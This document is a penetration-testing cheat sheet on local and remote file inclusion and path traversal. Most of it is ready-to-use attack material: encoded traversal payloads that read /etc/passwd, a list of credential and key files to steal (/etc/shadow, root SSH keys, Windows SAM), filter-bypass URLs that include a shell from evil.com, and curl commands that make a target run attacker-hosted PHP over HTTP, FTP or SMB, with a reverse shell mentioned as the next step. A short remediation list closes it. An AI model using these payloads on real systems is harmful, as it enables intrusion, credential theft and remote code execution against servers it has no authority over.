# File Inclusion - LFI/RFI/Path trav

**File Inclusion** vulnerabilities allow an attacker to **include files on a server through a web application's input**. \
This happens when the application uses user input to construct paths to files and then includes those files in the execution process, without proper validation or sanitization.



There are two main types:

* Local File Inclusion (LFI)
* Directory/Path Traversal
* Remote File Inclusion (RFI)

## Local File Inclusion (LFI) - Path Traversal

The **Local File Include** vulnerability is a web vulnerbility that allows a hacker to read/view sensitive information **already present on the server** such as **configuration files**, **logs**, or even **executable code**.

In practice, the follow URL may be affected by LFI vulnerability:

```
https://company.com/download?ticket=3123345123-345345123.json
```

We see that we can change the variable indicating the file to be displayed. Try to change it with a local file with possible sensitive information:

```
https://company.com/download?ticket=../../../../../../etc/passwd
```

This URL will display the entire file content.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
[..snip..]
```

### Steps for testing for LFI

1. Find an entry point that could be via `GET`, `POST`, `COOKIE`, or HTTP header values!
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files

### Bypass Techniques

* Use **some payloads** to bypass basic filter
* Add **NULL BYTE** `%00` at the end of the file to avoid extention force (fixed in php 5.3.4)
* **Change the request method** GET to POST and viceversa to avoid filter in specific request method.





### Fuzzing tools

#### Ffuf

```bash
ffuf -u 'URL/image?filename=FUZZ' -w /PATH/TO/WORDLIST 
```

#### Burp Suite

Intercept the request and send it to Intruter. Now load a wordlist and start the SNIPER attack

<figure><img src="../../../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>



### Bypass Payloads

{% code title="Files" %}
```
/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
```
{% endcode %}

{% code title="Manual" overflow="wrap" %}
```bash
# bypass include php function
../../../../../../etc/passwd 

# set NULL BYTE at the end to bypass file type and bypass Blacklist filter, not working with PHP 5.3.4 and above
../../../../../../etc/passwd%00 

# bypass ./ replaces by empty string
....//....//....//....//....//etc/passwd 
?page=..///////..////..//////etc/passwd
?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

# Double encoding
?page=%252e%252e%252fetc%252fpasswd
?page=%252e%252e%252fetc%252fpasswd%00

# UTF-8 Encoding
?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

# Path Truncal
# On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.
?page=../../../[ADD MORE]../../../../etc/passwd

# can bypass filter to avoid blacklisting 
?page=x/../admin # enter in x dir, back up one dir and lastly go to admin
```
{% endcode %}

#### URL Encoding

| Character | Encoded |
| --------- | ------- |
| `.`       | `%2e`   |
| `/`       | `%2f`   |
| `\`       | `%5c`   |

#### Double Encoding

| Character | Encoded |
| --------- | ------- |
| `.`       | `%252e` |
| `/`       | `%252f` |
| `\`       | `%255c` |

#### Unicode Encoding

| Character | Encoded  |
| --------- | -------- |
| `.`       | `%u002e` |
| `/`       | `%u2215` |
| `\`       | `%u2216` |

#### Overlong UTF-8 Unicode Encoding

| Character | Encoded                         |
| --------- | ------------------------------- |
| `.`       | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/`       | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\`       | `%c0%5c`, `%c0%80%5c`           |



### Sensitive file to get

{% code title="Linux Web Server" %}
```bash
/etc/passwd # system's user
/etc/shadow # system's password 
/etc/hosts # may contain subdomain
/etc/issue # 
/etc/profile # controls system-wide default variables
/proc/version # specifies the version of the Linux kernel
/root/.bash_history
/var/log/apache2/access.log # may contain credentials
/var/log/auth.log # ssh logon
/var/log/secure # admin activities
/var/log/dmessage # contains global system messages
/var/mail/root
/root/.ssh/id_rsa # private ssh keys for a root or other accounts

```
{% endcode %}

{% code title="Windows Web Server" %}
```bash
C:\Windows\System32\drivers\etc\hosts # other domain and subdomain
C:\Windows\System32\config\SAM # password hashes 
C:\inetpub\logs\LogFiles\W3SVC1\*.log # IIS log
C:\Users\Administrator\Desktop\* # admin files
C:\boot.ini # contains the boot options with BIOS firmware
```
{% endcode %}



## Remote File Inclusion (RFI)

**Remote File Inclusion (RFI)** is a technique to include remote files into a vulnerable application. \
Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. \
One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

* Sensitive Information Disclosure
* Cross-site Scripting (XSS)
* Denial of Service (DoS)



The ways to achieve RCE from LFI are this:

* Log file poisoning
* Email inclusion
* Via /proc/\*/fd/\*
* Via /proc/self/environ
* Via upload
* Via PHP sessions
* Via SSH
* Via PHP filters

For more information read the link below

{% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning" %}

{% embed url="https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion#lfi2rce" %}

### Filter Bypass

```bash
# NULL BYTE
http://example.com/index.php?page=http://evil.com/shell.txt%00

# DOUBLE ENCODING
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```



### via HTTP[​](https://www.thehacker.recipes/web/inputs/file-inclusion/rfi-to-rce#via-http) <a href="#via-http" id="via-http"></a>

The tester can host an arbitrary PHP code and access it through the HTTP protocol.

```bash
# Create phpinfo.php
echo '<?php phpinfo(); ?>' > phpinfo.php

# Start a web server
python3 -m http.server 80

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=http://tester.server/phpinfo.php'

# If Remote File Read works we can create a rev.php file with reverse shell inside
```



### via FTP[​](https://www.thehacker.recipes/web/inputs/file-inclusion/rfi-to-rce#via-ftp) <a href="#via-ftp" id="via-ftp"></a>

The tester can also host his arbitrary PHP code and access it through the FTP protocol. He can use the python library pyftpdlib to start a FTP server.

bash

```bash
# Start FTP server
sudo python3 -m pyftpdlib -p 21   
[I 2022-07-11 00:04:26] concurrency model: async
[I 2022-07-11 00:04:26] masquerade (NAT) address: None
[I 2022-07-11 00:04:26] passive ports: None
[I 2022-07-11 00:04:26] >>> starting FTP server on 0.0.0.0:21, pid=176948 <<<

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=ftp://tester.server/phpinfo.php'
```

{% hint style="info" %}
PHP uses the anonymous credentials to authenticate to the FTP server. If the tester needs to use custom credentials, he can authenticate as follows :

`curl '$URL/?parameter=ftp://user:pass@tester.server/phpinfo.php'`
{% endhint %}



### via SMB[​](https://www.thehacker.recipes/web/inputs/file-inclusion/rfi-to-rce#via-smb) <a href="#via-smb" id="via-smb"></a>

Sometimes, the vulnerable web application is hosted on a Windows Server, meaning the attacker could log into a SMB Server to store the arbitrary PHP code.

[Impacket](https://github.com/SecureAuthCorp/impacket)'s [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) (Python) script can be used on the attacker-controlled machine to create a SMB Server.

```bash
sudo python3 smbserver.py -smb2support share $(pwd) 130 
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

The PHP script can then be included by using a [UNC](https://en.wikipedia.org/wiki/Universal_Naming_Convention) Path.

```bash
curl '$URL/?parameter=\\tester.server\phpinfo.php'
```



## Downloads bypass

A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string. `%2500`

{% code title="Payload to download all file bypassing restriction (only pdf and md file)" %}
```
http://10.10.94.254/ftp/package.json.bak%2500.md
```
{% endcode %}



## Remediations

* Keep system and services, including web app framework, updated with the latest version.
* Turn off PHP errors to avoid leaking the path of the application and other potentially revealing info
* A WeB App Firewall (WAF) is a good option to help mitigate web app attacks
* Disable some PHP features that cause file inclusion vuln if your web app doesn't need them, such as `allow_url_fopen` on and `allow_url_include`.
* Carefully analyze the web app and allow only protocols and PHP wrappers that are in need.
* Never trust user input, and make sure to implement proper input validation against file inclusion.
* Implement whitelisting for file names and locations as well as blacklisting.





## Resources

{% embed url="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" %}

{% embed url="https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" %}

{% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/rfi-to-rce" %}
